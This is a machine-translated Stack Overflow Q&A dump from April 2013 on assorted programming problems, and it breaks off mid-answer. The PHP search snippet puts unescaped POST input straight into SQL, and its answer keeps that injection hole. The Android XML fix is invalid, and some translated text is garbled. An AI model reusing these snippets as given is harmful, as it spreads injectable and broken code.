# StackOverflow 问答 15998000-15998999

# php - AJAX 和 file_get_contents

> ID：15998000
> 
> 赞同：2
> 
> 时间：2013-04-14T10:22:04.153
> 
> 标签：php, jquery, ajax

我有一个使用 file_get_contents 的脚本，然后我解码返回的 JSON ...

```
$urlone = json_decode(file_get_contents("http://api.twitter.com/1/statuses/user_timeline.json?include_entities=true&include_rts=false&screen_name=".$screen_name."&count=".$tweet_count."&page=1"),true); 
```

我想要实现的是一个回调，这样我就可以拥有一个不错的加载器，然后在完成时为内容设置动画。如果启用 Javascript，是否有办法使用 JQuery 进行 AJAX 调用，如果禁用则回退到默认 PHP？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-14T10:29:49.350

PHP 在处理来自用户的请求时不知道用户是否启用了 JavaScript，至少在第一个请求时不知道。

通常你会假设用户没有 JavaScript 并从那里进行增强，但是当你想“回退”到 PHP 时，无论用户是否有 JavaScript 功能，你都需要渲染 JSON - 所以现在使用 JavaScript 会有点毫无意义，因为您（和用户）已经拥有数据。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-14T10:36:24.370

你可以做的是：

*   确认在之前的请求中启用了 js。如果启用依赖于启用 javascript 的 php 文件的链接。如果没有，链接到直接显示输出的 php 文件。您可以结合使用元重定向和 Javascript 来做到这一点。
*   或者在标签内的 iframe 中直接输出调用 php 文件，该文件`<noscript>`属于执行 jquery 的标签。

在第一个选项中，您将 file.php 链接到 fileWithJs.php 或 fileWithoutJs.php

在第二个选项中，您将拥有如下内容：

```
<script>
    // jquery here
</script>
<noscript><iframe src="data.php"></iframe></noscript> 
```

# javascript - javascript中的序数

> ID：15998005
> 
> 赞同：5
> 
> 时间：2013-04-14T10:22:43.357
> 
> 标签：javascript, coffeescript, ordinals

有没有什么优雅的方法可以在 js/coffee 中获取 word 格式的序数？像这样的东西：

```
ordinalInWord(1) # => "first"
ordinalInWord(2) # => "second"
ordinalInWord(5) # => "fifth" 
```

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2013-04-14T10:39:40.440

恐怕序数不够规则，无法避免将它们中的每一个都打出来。

```
function ordinalInWord( cardinal ) {
    var ordinals = [ 'zeroth', 'first', 'second', 'third' /* and so on */ ];

    return ordinals[ cardinal ];
} 
```

如果您需要该功能在 20 岁以后工作，您可以利用出现的模式：

```
function ordinalInWord( cardinal ) {
    var ordinals = [ 'zeroth', 'first', 'second', 'third' /* and so on up to "twentieth" */ ];
    var tens = {
        20: 'twenty',
        30: 'thirty',
        40: 'forty' /* and so on up to 90 */
    };
    var ordinalTens = {
        30: 'thirtieth',
        40: 'fortieth',
        50: 'fiftieth' /* and so on */
    };

    if( cardinal <= 20 ) {                    
        return ordinals[ cardinal ];
    }

    if( cardinal % 10 === 0 ) {
        return ordinalTens[ cardinal ];
    }

    return tens[ cardinal - ( cardinal % 10 ) ] + ordinals[ cardinal % 10 ];
} 
```

演示：http: [//jsfiddle.net/AQCqK/](http://jsfiddle.net/AQCqK/)

将其扩展到 99 之后应该不难。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2017-06-16T13:59:24.997

这是最高 64 位的解决方案。我无法想象你为什么需要它，但为什么从来都不是问题。

```
var nth = function(i){
  var n = ["one", "two", "three", "four", "five", "six", "seven", "eight", "nine", "ten", "eleven", "twelve", "thirteen", "fourteen", "fifteen", "sixteen", "seventeen", "eighteen", "nineteen"];
  var s = ["zeroth", "first", "second", "third", "fourth", "fifth", "sixth", "seventh", "eighth", "ninth", "tenth",
       "eleventh", "twelfth", "thirteenth", "fourteenth", "fifteenth", "sixteenth", "seventeenth", "eighteenth", "nineteenth"];
  var p = ["twent", "thirt", "fourt", "fift", "sixt", "sevent", "eight", "ninet"];
  var c = ["hundred", "thousand", "million", "billion", "trillion", "quadrillion", "quintillion"];
  var b = Math.floor(Math.log10(i));
  if(i<20) return s[i]; // Special case for sub-20
  if(b==1){ // Between 21 and 99
    if(i%10 === 0) return p[Math.floor(i/10)-2]+"ieth"; // On the tens, return p+"ieth"
    return p[Math.floor(i/10)-2] + "y-" + s[i%10]; // Otherwise, return hyphenated
  }
  if(b==2){ // Between 100 and 999
      var e = Math.floor(i/Math.pow(10,b)); // The first number
      return n[e-1]+"-"+c[0]+" "+nth(i-(e*Math.pow(10,b)));
  }
  // Greater than 1000 we break into groups of 10^3 followed by a multiplier
  var m = b%3 + 1; // Take the first m digits off
  var cm = Math.floor(b/3);
  var x = Math.floor(i/Math.pow(10,b-m+1));
  var numberToString = function(y){ // Converts a number less than 1000 to its string representation as a multiplier
    if(y<20) return n[y-1];
    if(y<100) return p[Math.floor(y/10)-2] + "y-" + n[y%10-1];
    return n[Math.floor(y/100)-1] + " " + c[0] + " " + numberToString(y-(Math.floor(y/100)*100));
  }
  return numberToString(x) + " " + c[cm] + " " + nth(i-(x*Math.pow(10, b-m+1)));
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2021-08-26T19:52:08.087

派对有点晚了，但是这个呢？

```
const numberToOrdinal = (n) => {
  const s = ['th', 'st', 'nd', 'rd'];
  const v = n % 100;
  return n + (s[(v - 20) % 10] || s[v] || s[0]);
}; 
```

# java - 为什么整数数据类型会静默溢出而不是抛出异常

> ID：15998008
> 
> 赞同：6
> 
> 时间：2013-04-14T10:23:04.507
> 
> 标签：java, integer, long-integer, integer-overflow

我已经了解到（至少在 java 中）整数/长值无提示溢出，并且它们的值从溢出时的最小值开始，而不是抛出任何异常。

我正在使用外部 api 进行一些文件操作，其中最大文件大小是从属性文件加载的。在我的本地测试环境中一切都很好。代码进入实时环境后，最大文件大小限制根本不起作用。经过两天的调试/分析代码，根本没有成功。然后由于其他一些原因，我使用了实时的 constants.properties 文件并用它调试了代码。o_0

我只想问，是什么阻止他们在溢出时抛出异常？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-14T10:26:01.753

在许多情况下，Java 基于 C 或 C++，而这些基于 Assembly。溢出/下溢在 C 和 C++ 中是无声的，而在汇编中几乎是无声的（除非您检查特殊标志）。这可能是因为 C 和 C++ 在首次提出时没有例外。如果您想查看溢出/下溢，您只需使用更大的类型。例如`long long int`或`long double`;) BTW 程序集有类似于称为陷阱或中断的异常，溢出/下溢不会导致陷阱 AFAIK。

我喜欢做的是使用`long`，`double`除非我确定这些类型比需要的大得多。您不能拥有`long`尺寸溢出的设备。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-14T10:37:01.603

原因是“因为 Java 语言规范是这么说的”。

[第 4.2.2 节。](http://docs.oracle.com/javase/specs/jls/se7/html/jls-4.html#jls-4.2.2)JLS 的[整数运算说：](http://docs.oracle.com/javase/specs/jls/se7/html/jls-4.html#jls-4.2.2)

> 整数运算符不以任何方式指示上溢或下溢。

对我来说这是有道理的，否则你需要：

*   要抛出一个“NumericOverflowException”，这需要一个“try catch”，或者
*   要在原始结果上设置的标志，这将需要对原始操作进行更复杂的处理

两者都会使原语及其操作“不简单”，而原语的简单性是一种不值得为可预测且通常很少发生的事件而牺牲的力量。

# ruby-on-rails - 使用设计时的多态用户模型

> ID：15998010
> 
> 赞同：0
> 
> 时间：2013-04-14T10:23:22.553
> 
> 标签：ruby-on-rails, devise, polymorphic-associations, polymorphism

我正在建立一个工作委员会，因此有两个用户模型以及雇主和申请人。我正在使用设计，因此我现在的挑战是将其与多态关系一起使用。

通过一些rails控制台测试，我知道设计中的（资源）传递了所有用户信息，并且传递了role_type，即申请人或雇主。但是它设置为 nil，因此虽然我的用户被保存，但它并没有保存申请人或雇主的角色类型。此外，仅在用户表中的申请人或雇主表中没有保存任何内容。我的代码在下面，但我的问题实际上是如何将 role_type 传递给设计资源哈希？或者，如果这不可能是解决这个问题的最优雅的方法。

非常感谢！

如果我错过了任何东西，完整的项目代码也在这里[https://github.com/PatGW/jobs](https://github.com/PatGW/jobs)

下面是视图->设计->用户->new.html.erb

```
<h1>Sign Up</h1>

 <%= form_for @user do |f| %>
<% if @user.errors.any? %>
    <div class="error_messages">
        <h2> Form is invalid</h2>
        <ul>
            <% for message in @user.errors.full_messages %>
            <li><%= message %></li>
            <% end %>
        </ul>
    </div>
<% end %>
<p>
    <%= f.label :email %><br />
    <%= f.text_field :email %>
</p>
<p>
    <%= f.label :password %><br />
    <%= f.password_field :password %>
</p>
<p>
    <%= f.label :password_confirmation %><br />
    <%= f.password_field :password_confirmation %>
</p>

<p>
    <%= radio_button_tag :role_type, "employer", :checked => false %><br />
    <%= label :role_type, 'Employer' %>
</p>
<p>
    <%= radio_button_tag :role_type, "applicant", :checked => true %><br />
    <%= label :role_type, 'Applicant' %>
</p>

<p class="button"><%= f.submit %></p>
<% end %> 
```

继承自 DeviseController 的 UsersController

```
class UsersController < Devise::RegistrationsController

def new
super
 end

def create
 User.transaction do
  super
  after_sign_in_path(resource)
 end
end

private

def after_sign_in_path(resource)
 debugger
  @user = User.new(params[:user])
 if params[:role_type] == "coach"
  role = Employer.create
 else params[:role_type] == "player"
  role = Applicant.create
 end 
 end

end 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-14T14:09:59.917

这里的问题不是设计相关的，而是关联/OO相关的。我检查了您的代码：您的申请人和雇主模型似乎有一个用户字段，而这些模型实际上应该从用户继承，因为它们是一种用户。所以，试试这个：

```
class Employer < User
  attr_accessible :location, :logo, :name
end 
```

对于初学者，看看它是否有帮助。（顺便说一句：显然，您还应该更改申请人的代码）

# mysql - MySQL强制转换为十进制不能按预期工作

> ID：15998012
> 
> 赞同：2
> 
> 时间：2013-04-14T10:23:50.883
> 
> 标签：mysql, sql, decimal

这个查询：

`SELECT CAST(30.123456789012345 AS DECIMAL(16,16))`

退货`0.9999999999999999`。

除非我完全错了，否则它应该返回`30.1234567890123450`。

谁能解释发生了什么？

谢谢！

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-14T10:25:32.423

你会需要`DECIMAL(18,16)`.

`16,16`为小数点右侧的值保留所有 16 位可用的精度。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-14T10:28:44.747

`DECIMAL(18, 16)`应该管用。正如您在[MySQL 手册](http://dev.mysql.com/doc/refman/5.1/en/precision-math-decimal-changes.html)中所读到的：

> DECIMAL 列的声明语法是 DECIMAL(M,D)。MySQL 5.1 中参数的取值范围如下：
> 
> M 是最大位数（精度）。它的范围是 1 到 65。（旧版本的 MySQL 允许的范围是 1 到 254。）
> 
> D 是小数点右侧的位数（刻度）。它的范围是 0 到 30，并且不能大于 M。

所以`DECIMAL(16,16)`告诉 MySQL 使用所有数字作为十进制数字，没有任何整数部分。

# php - 按条件搜索不返回任何记录

> ID：15998017
> 
> 赞同：0
> 
> 时间：2013-04-14T10:24:21.163
> 
> 标签：php, sql

我正在尝试检查 POST 或 GET 是否有我的搜索变量，然后将变量添加到我的查询中。然后，我想将这些变量的数组名称传递到 URL 中，以便对搜索结果进行分页。在某人的帮助下，这就是我走了多远。

```
$criteria = array('ctitle', 'csubject', 'creference', 'cat_id', 'cmaterial', 'ctechnic', 'cartist', 'csource', 'stolen');
$likes = "";
$url_criteria = '';
foreach ( $criteria AS $criterion ) {
if ( ! empty($_POST[$criterion]) ) {
$value = ($_POST[$criterion]);
$likes .= " AND `$criterion` = '%$value%'";
$url_criteria .= '&amp;'.$criterion.'='.htmlentities($_POST[$criterion]);
} elseif ( ! empty($_GET[$criterion]) ) {
$value = mysql_real_escape_string($_GET[$criterion]);
$likes .= " AND `$criterion` = '%$value%'";
$url_criteria .= '&amp;'.$criterion.'='.htmlentities($_GET[$criterion]);
}
}
$sql = "SELECT * FROM collections WHERE c_id>0" . $likes . " ORDER BY c_id ASC";
echo $sql; 
```

我在这里遇到的问题是，在修改了我之前的查询之后，我用来搜索的任何条件都不会返回任何记录，即使这些记录存在也是如此。我还回应了查询，它打印了以下行：

```
SELECT * FROM collections WHERE c_id>0 AND `cmaterial` = '%wood%' ORDER BY c_id ASC 
```

请问，我在这里错过了什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-14T10:33:34.520

在连接部分条件时，您应该使用 LIKE 关键字而不是 =。您的条件意味着搜索完全匹配，包括 % 符号，而 LIKE 意味着按模式搜索。

```
$likes .= " AND `$criterion` LIKE '%$value%'"; 
```

# java - 如何避免在初始绘制组件时出现 NullPointerException？

> ID：15998018
> 
> 赞同：-1
> 
> 时间：2013-04-14T10:24:24.990
> 
> 标签：java, swing, nullpointerexception, awt

目前我正在尝试制作国际象棋游戏。这个，主类，调用 JPanel 子类，我在其上绘制图形。

```
package schach;

public class schach extends JFrame {

  private SpielFeld spiel = new SpielFeld();

  public schach(String title) {

    Container cp = getContentPane();
    cp.add(spiel, BorderLayout.CENTER);
  }

  public static void main(String[] args) {
    new schach("Schach");
  }  
} 
```

然后继续使用 JPanel 子类 SpielFeld，它应该绘制图形和白板：

```
package schach;

public class SpielFeld extends JPanel {

  private Image brettimg =     new ImageIcon("schach\\sprites\\brett.png").getImage();
  private Image bauerWimg =    new ImageIcon("schach\\sprites\\bauerW.png").getImage();

  private ArrayList<Figur> figuren = new ArrayList<Figur>();

  private Bauer bauerW1 = new Bauer(6, 0);

  public SpielFeld() {
    figuren.add(bauerW1);
  }

  @Override
  public void paintComponent(Graphics g) {

    g.drawImage(brettimg, 0, 0, null);

    for (int i=0; i<figuren.size(); i++) {
      g.drawImage(bauerWimg, (int) figuren.get(i).getPoint().getX()*64, (int) figuren.get(i).getPoint().getY()*64, null);
    }    
  }
} 
```

现在我确实得到了 NullPointerException。我认为这是因为创建“spiel”的顺序，调用paintComponent（默认情况下，将JFrame添加到ContentPane或其他东西？）并且创建并填充ArrayListed。我试图注释掉一些东西以查看它是如何工作的，但似乎无法弄清楚。它是如何工作的，我该如何解决这个问题？我试图删除希望不重要的东西。

图.java

```
package schach;

public class Figur {

  Point posi;

  public Figur(int x, int y) {
    posi.setLocation(x, y);
  }

  public Point getPoint() {
    return posi;
  }
} 
```

鲍尔.java

```
package schach;

public class Bauer extends Figur {

  boolean zug = false;

  public Bauer(int x, int y) {
    super(x, y);
  }
} 
```

@skirsch 这个？

```
Exception in thread "main" java.lang.NullPointerException
    at schach.Figur.<init>(Figur.java:10)
    at schach.Bauer.<init>(Bauer.java:8)
    at schach.SpielFeld.<init>(SpielFeld.java:29)
    at schach.schach.<init>(schach.java:10)
    at schach.schach.main(schach.java:31) 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-14T11:36:22.430

在 Figur 类中，Point posi 未初始化，因此为 null。代替

```
public Figur(int x, int y) {
    posi.setLocation(x, y);
} 
```

经过

```
public Figur(int x, int y) {
    posi = new Point(x, y);
} 
```

消除 NullPointer 异常。

# java - 如何更改 JButton 大小

> ID：15998024
> 
> 赞同：0
> 
> 时间：2013-04-14T10:25:36.127
> 
> 标签：java, swing, jbutton, preferredsize

我正在做一个百万欧元的计划，我需要一些帮助。我有这段代码，我想为 JButton 设置一个大小。我不知道该怎么做

有人可以告诉我我需要改变什么吗？

```
static JButton[][] botoes = new JButton[5][10];
static JButton [][] estrelas = new JButton[4][3];

public void grafica(){
    GridLayout layoutBotoes = new GridLayout(5,10);
    GridLayout layoutEstrelas = new GridLayout(4,3);
    um.setLayout(layoutBotoes);
    dois.setLayout(layoutEstrelas);
    for(i=0;i<5;i++){  
        for(l=0;l<10;l++){  
            cont++;
            botoes[i][l] = new JButton(""+cont);
            um.add(botoes[i][l]); 
            botoes[i][l].addActionListener(this);
        } 
    }  
    cont=0;
    for(i=0;i<4;i++){  
        for(l=0;l<3;l++){ 
            if(i==3 && l==2) {
                break;
            } else {
                cont++;
                estrelas[i][l] = new JButton(""+cont); 
                dois.add(estrelas[i][l]); 
                estrelas[i][l].addActionListener(this);
            }
        }
    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-14T11:41:38.497

您也许可以使用[此处](https://stackoverflow.com/q/14589119/230513)或[此处](https://stackoverflow.com/q/2899935/230513)显示的方法之一。

![图片](https://i.stack.imgur.com/og0BG.png)

# vb.net - Vb.net: Send text to window via windows messages

> ID：15998025
> 
> 赞同：0
> 
> 时间：2013-04-14T10:25:39.733
> 
> 标签：vb.net

I'm trying to make a program with vb.net (VS2008) for studio shooting with my Nikon D600. I'm using a program called ControlMyNikon for tethered shooting and it's working perfectly. It has this external control-feature with following instructions: [http://i.jjj.fi/a9dAQ7z.png](http://i.jjj.fi/a9dAQ7z.png)

Could someone give me hint what does 'send string to 'ControlMyNikon v4.1' window with windows messages' actually mean?

I tried with SendMessages. I was able to change window title with WM_SETTEXT but that's all. I'm able to get the window handle but don't know how to send any string to it.

Help? :)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-14T12:18:02.043

呃，尼康因编写真正糟糕的铲子而臭名昭著。这并不令人失望。以下是一些应该起作用的声明。首先尝试 Unicode 版本。如果生成中文文本，则使用 Ansi 版本：

```
Imports System.Runtime.InteropServices

Class NativeMethods
    Friend Const WM_SETTEXT As Integer = 12

    <DllImport("user32.dll", EntryPoint:="SendMessageW", CharSet:=CharSet.Unicode)> _
    Friend Shared Function SetWindowTextUnicode(ByVal hWnd As IntPtr, ByVal Msg As Integer, ByVal wParam As IntPtr, ByVal lParam As String) As IntPtr
    End Function

    <DllImport("user32.dll", EntryPoint:="SendMessageA", CharSet:=CharSet.Ansi)> _
    Friend Shared Function SetWindowTextAnsi(ByVal hWnd As IntPtr, ByVal Msg As Integer, ByVal wParam As IntPtr, ByVal lParam As String) As IntPtr
    End Function
End Class 
```

用法：

```
NativeMethods.SetWindowTextUnicode(handleYouFound, WM_SETTTEXT, IntPtr.Zero, "shoot") 
```

如果两者都不起作用，那么您可能使用了错误的窗口句柄。使用 Spy++ 仔细检查您是否正确定位了窗口。

# sparql - 为 DBpedia 生成 SPARQL 查询，给出不同的结果

> ID：15998026
> 
> 赞同：0
> 
> 时间：2013-04-14T10:25:48.877
> 
> 标签：sparql, dbpedia

我正在使用 SPARQL 查询 DBpedia 数据库。我的第一个查询如下：

```
select ?s1 ( bif:search_excerpt ( bif:vector ( 'TENDULKAR', 'SACHIN' ) , ?o1 ) ) where 
{ 
 { 
  { 
    select ?s1, ( ?sc * 3e-1 ) as ?sc, ?o1, ( sql:rnk_scale ( <LONG::IRI_RANK> ( ?s1 ) ) ) as ?          rank, ?g where 
    { 
      quad map virtrdf:DefaultQuadMap 
      { 
        graph ?g 
        { 
          ?s1 ?s1textp ?o1 .
          ?o1 bif:contains ' ( TENDULKAR AND SACHIN ) ' option ( score ?sc ) .

        }
       }
     }
   order by desc ( ?sc * 3e-1 + sql:rnk_scale ( <LONG::IRI_RANK> ( ?s1 ) ) ) limit 20 offset 0 
  }
 }
} 
```

现在，即使我将`DISTINCT`关键字应用于查询，它也会给出与以前相同的结果。

我想从这个查询中得到不同的结果。

# html - disable subpixel aliasing on html/css borders

> ID：15998031
> 
> 赞同：10
> 
> 时间：2013-04-14T10:26:29.003
> 
> 标签：html, css, subpixel

I'm using css `transform:scale` to scale some elements up, and now the borders, which were originally `1px solid black`, get some subpixel rendering - 'antialiasing' - since they are now `1.4px` or something. Exactly how it looks depends on the browser, but its blurry on all modern browsers.

Can I disable subpixel rendering for certain elements?

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2020-05-06T09:30:38.877

使用 缩小比例时遇到了类似的问题`transform: scale(ratio)`，除了边界将在子像素渲染上完全消失而不是模糊。

由于我处于类似的用例（使用js动态缩放），我决定实现原作者评论中建议的javascript解决方案：

```
container.style.transform = "scale(" + ratio + ")";
elementWithBorder.style.border = Math.ceil(1 / ratio) + "px solid lightgray"; 
```

但是，在升级的情况下，我建议 Math.floor() 避免过多地“增肥”边界。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-09-26T21:51:56.530

您可以使用以下 css 在 WebKit 上控制文本抗锯齿：-webkit-font-smoothing: antialiased; 有时会通过以下方式强制 3d 加速： -webkit-transform: translate3d(0, 0, 0); 也有助于混叠（至少在我的经验中使用旋转时）。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2021-05-27T09:58:29.457

设置`perspective`属性似乎可以解决问题：

```
.subpixel-modal {
    transform: translate(-50%, -50%);
    perspective: 1px;
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2017-01-30T19:09:26.987

这很模糊，因为 72 dpi 的标准显示器无法呈现小数像素大小，我相信您理解。此外，[规范](https://developer.mozilla.org/en-US/docs/Web/CSS/Webkit_Extensions)中没有任何内容会影响边框的渲染或锯齿。

像素宽度为 2 可能会给您带来更好的结果，但几乎所有内容都会变得模糊。

一些视网膜设备和显示器确实支持[亚像素边框宽度](http://dieulot.net/css-retina-hairline)，但在跨浏览器支持方面没有一致的解决方案。

在我自己的测试中，我发现从角落缩放时效果更好，而不是默认情况下居中。以及增加四分之一或一半的数量。

```
transform: scale(1.25);
transform-origin: left top; 
```

# android - Android：TabActivity 内带有适配器的可重绘 ListView。视图不会改变 FIXED

> ID：15998035
> 
> 赞同：0
> 
> 时间：2013-04-14T10:27:20.570
> 
> 标签：android, listview, android-tabhost, tabactivity

所以我的 TabHost 中有一个 ListView，我想在每次更改选项卡时重新显示它的内容。尽管如此，我从来没有绘制过列表。

我的 xml 文件如下所示：

```
<?xml version="1.0" encoding="utf-8"?>
<TabHost xmlns:android="http://schemas.android.com/apk/res/android"
    android:id="@android:id/tabhost"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent" >
    <LinearLayout
        android:orientation="vertical"
        android:layout_width="fill_parent"
        android:layout_height="fill_parent"
        android:padding="5dp">
        <TabWidget
            android:id="@android:id/tabs"
            android:layout_width="fill_parent"
            android:layout_height="wrap_content" />
        <FrameLayout
            android:id="@android:id/tabcontent"
            android:layout_width="fill_parent"
            android:layout_height="fill_parent"
            android:padding="5dp" />
            <!-- Dishes Panel  -->
            <ListView xmlns:android="http://schemas.android.com/apk/res/android"
                        xmlns:tools="http://schemas.android.com/tools"
                        android:id="@+id/dishSelector"
                        android:layout_height="wrap_content"
                        android:layout_width="fill_parent"
                        tools:context=".MenuSelectorActivity" />
    </LinearLayout>
</TabHost> 
```

还有我的 TabActivity：

```
 public class MenuSelectorActivity extends TabActivity implements TabHost.TabContentFactory{    
        private ListView dishSelector;
        private DishSelectorAdapter dishSelectorAdapter;
        private TabHost tabHost;
        private DishDao dishDao;
        private DishTypeDao dishTypeDao;
        private Map<Integer, List<DishPojo>> dishesByType;

        @Override
        protected void onCreate(Bundle savedInstanceState) {
            super.onCreate(savedInstanceState);
            setContentView(R.layout.activity_menu_selector);

            tabHost = getTabHost();  // The activity TabHost
            tabHost.setup();
            TabHost.TabSpec spec;
            dishDao = new DishDao(this);
            dishTypeDao = new DishTypeDao(this);

            dishesByType = new HashMap<Integer, List<DishPojo>>();//new ArrayList<List<DishPojo>>();

            List<DishType> types = dishTypeDao.list();
            TextView dTypeNameView;

            for(DishType dType : types){
                dishesByType.put(dType.getId().hashCode(), createDishPojoList(dishDao.list(
                        new String[]{DishDbContract.SQL_WHERE_CLAUSE_LIST_BY_TYPE}, new String[]{dType.getId()})));
            }
            tabHost.setCurrentTab(0);

            for(DishType dType : types){
                dTypeNameView = new TextView(this);
                dTypeNameView.setText(dType.getDescription());
                spec = tabHost.newTabSpec(dType.getId()).setIndicator(dTypeNameView).setContent(this);
                tabHost.addTab(spec);
            }
        }

        @Override
        public View createTabContent(String tag) {

            dishSelector = (ListView) findViewById(R.id.dishSelector);
            if(dishSelectorAdapter == null){
                dishSelectorAdapter = new DishSelectorAdapter(this, dishesByType.get(tag.hashCode()));
            }else{
                dishSelectorAdapter.setDishToSelect(dishesByType.get(tag.hashCode()));
            }
            dishSelector.setAdapter(dishSelectorAdapter);
            dishSelector.refreshDrawableState();
            return dishSelector;
        }
        private List<DishPojo> createDishPojoList(List<Dish> dishes){
            //creates a list of Pojos
        }
} 
```

适配器 DishSelectorAdapter 已经在其他情况下使用过并且工作正常，所以我认为它在这里不相关。

亲手感谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-14T18:38:43.093

好吧，这并没有我想象的那么难。答案就在我眼前。

我没有将 ListView 放在 de FrameLayout 中。正确的代码将是：

```
<?xml version="1.0" encoding="utf-8"?>
<TabHost xmlns:android="http://schemas.android.com/apk/res/android"
    android:id="@android:id/tabhost"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent" >
    <LinearLayout
        android:orientation="vertical"
        android:layout_width="fill_parent"
        android:layout_height="fill_parent"
        android:padding="5dp">
        <TabWidget
            android:id="@android:id/tabs"
            android:layout_width="fill_parent"
            android:layout_height="wrap_content" />
        <FrameLayout
            android:id="@android:id/tabcontent"
            android:layout_width="fill_parent"
            android:layout_height="fill_parent"
            android:padding="5dp" />
            <!-- Dishes Panel  -->
            <ListView xmlns:android="http://schemas.android.com/apk/res/android"
                        xmlns:tools="http://schemas.android.com/tools"
                        android:id="@+id/dishSelector"
                        android:layout_height="wrap_content"
                        android:layout_width="fill_parent"
                        tools:context=".MenuSelectorActivity" />
       </FrameLayout>
    </LinearLayout>
</TabHost> 
```

其余代码仍有一些问题需要解决，但我无法通过快速查看来解决。

# c# - Windows 服务 + Windows 窗体应用程序。一个数据库。关于并发的建议

> ID：15998036
> 
> 赞同：3
> 
> 时间：2013-04-14T10:27:24.913
> 
> 标签：c#, database, winforms, concurrency, windows-services

我有带有文件信息的 SQL Server 数据库——我说的是自定义属性。这些是每个文件的类别和描述。

Windows 窗体应用程序是供用户使用的。但我还将创建一个 Windows 服务来跟踪文件的任何更改。如果发生更改（重命名、移动、删除），服务必须相应地更新同一个数据库。而且我认为它应该立即进行，没有任何延迟。

现在这将是我第一次制作 WS 以及我第一次必须处理并发（理论上我知道线程等等）。

所以：

*   首先，如果一个进程正在更新另一个进程可能同时使用的数据库，是否可以？您是否需要首先处理这种情况？（可能，在我们日常的“用户生活”中，当文件被另一个进程使用时，我们无法修改文件）

*   这两个共享一个数据源的想法好吗？

*   如果是，那么如何处理并发？我可以将 WCF 用于两者之间的消息，但是该解决方案是否与 WCF 有关？因为我也将第一次使用它：D。

任何帮助表示赞赏。提前感谢您的时间！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-14T10:36:32.787

由于 MS SQL 是事务性的，所以没什么大不了的。您只需要注意可能由一个进程读取和更新的数据 - 可能需要使用 Transaction 范围（这是一个 .NET 类；））。

从软件架构的角度来看，您应该考虑使用三层而不是两层应用程序：

**两层**：
本质上是您的系统与持久层（DB）直接与客户端通信

**三层**：持久层 <--> 逻辑层（例如，处理应用程序逻辑的 WCF 服务）<--> 客户端（服务和表单 - 触发应用程序逻辑并显示结果）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-14T10:47:01.707

当涉及到并发性时，这将是非常直接的。MSSQL 数据库引擎几乎可以处理所有这些问题（例如锁定和共享）。此外，如果您利用 SqlCommandBuilder 构建语句，语句将自动使用乐观并发。

至于 Windows 服务以及它如何获得通知，请使用 FileSystemWatcher，它会更高效，并且您不会在本地机器上发布某些服务端口。

我通常会给你一些很好的代码示例，但我是通过手机回答这个问题的。

# json - 在 EmberJS 中使用密钥包装 JSON 有效负载

> ID：15998039
> 
> 赞同：0
> 
> 时间：2013-04-14T10:27:57.183
> 
> 标签：json, codeigniter, ember.js

好的，基本上我正在向 Codeigniter 发送一个包含一些 JSON 有效负载的 POST 请求。我使用 RESTadapater。JSON 在没有密钥的情况下被发送到那里，所以我无权访问它。

这是模型：

```
App.Bookmark = DS.Model.extend({
    title: DS.attr("string"),
    url : DS.attr("string")
}); 
```

这是控制器：

```
App.BookmarksNewController = Ember.ObjectController.extend({
    save: function(){
        this.get("model.transaction").commit();
        this.get("target").transitionTo("bookmarks");
    }
}); 
```

在 CI 中的 REST 实现中，我使用标准方式访问发布请求是`$this->input("key")`. 但是当生成上述请求时，只发送原始 JSON 数据。因此，我似乎没有办法以任何方式引用它。

举个例子：

```
function post(){
    $this->response(var_dump(file_get_contents("php://input")),200);
} 
```

给我这个输出：

```
string(48) "{"bookmark":{"title":"sdffdfsd","url":"sdfsdf"}}" 
```

我想看到的是：

```
string(48) payload="{"bookmark":{"title":"sdffdfsd","url":"sdfsdf"}}" 
```

然后是服务器，我可以使用类似的东西访问这个 JSON`$this->post("payload").`

所以 1 of 2\. 无论如何要用密钥包装 JSON 有效负载？或者无论如何在没有可用密钥的情况下访问 CI 中的原始 JSON 数据？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-15T14:53:29.760

好的，我自己想通了（或者更确切地说是正确阅读示例）。

当使用 Adam Whitney 的 Phil Sturgeons [REST 控制器 fork for CodeIgniter](https://github.com/awhitney42/codeigniter-restserver-resources)时，JSON 有效负载将在`$this->_post_args`. 在底层实现中，他使用了我已经提到`file_get_contents("php://input")`的 .

编辑：同样的约定也适用于其他类型的请求，例如 DELETE 请求数据将在`$this->_delete_args`. 或者`$this->_args`是可以找到所有类型 args 的“神奇”地方。

# javascript - Remaining char counter with popup

> ID：15998040
> 
> 赞同：0
> 
> 时间：2013-04-14T10:27:57.363
> 
> 标签：javascript, javascript-events

My task is to create a counter/limiter, which pops a window when the limit is reached. I made this code:

```
$(document).ready(function() {
    $('#message-input').keyup(updateCounter);
});

function updateCounter() {

    var value = $('#message-input').val();

    if (value.length > 256) {
        alert('Túl hosszú az üzenet!');
        return false;
    }

    var remaining = 256 - value.length;
    $('#counter').text(remaining);

    return true;
} 
```

This code works great, but has a big problem: if the limit is reached, i can press anything, always the window pops up, even if i press backspace. How can i correct that?

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-14T10:29:38.643

尝试这个：

```
$(document).ready(function() {
    $('#message-input').keyup(updateCounter);
});

function updateCounter(e) {
